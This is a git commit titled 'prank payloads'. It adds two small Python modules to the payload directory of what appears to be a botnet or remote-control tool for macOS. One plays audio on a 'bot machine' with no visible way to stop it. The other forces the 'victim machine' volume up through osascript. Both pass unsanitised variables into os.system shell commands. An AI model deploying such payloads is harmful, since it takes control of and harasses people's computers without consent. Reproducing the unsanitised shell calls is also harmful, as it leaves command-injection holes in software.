5f3cb3d3df2720c6d10755a78aea9d25e694dbc1
Evan King <esk79@cornell.edu>
2017-01-05 23:21:01 -0800

    prank payloads

---
+++ server/payloads/osx/play_music_osx.py
@@ -0,0 +1,16 @@
+'''
+NAME: Play Music
+DESCRIPTION: Plays the provided audio file with no visible way of stopping it
+VAR FILE: Path to audio file on the bot machine
+'''
+import os
+import sys
+
+if os.system('afplay {}'.format(FILE)) == 0:
+    sys.stdout.write("Success!")
+else:
+    sys.stderr.write("Error!")
+
+
+
+
---
+++ server/payloads/osx/set_volume_osx.py
@@ -0,0 +1,11 @@
+'''
+NAME: Set Volume
+DESCRIPTION: Set the volume of the victim machine
+VAR VOLUME = 100: The volume level out of 100, defaults to 100/
+'''
+import os
+
+set_volume = "osascript -e 'set volume output volume {}'"
+os.system(set_volume.format(VOLUME))
+
+print "Volume set to {}%".format(VOLUME)
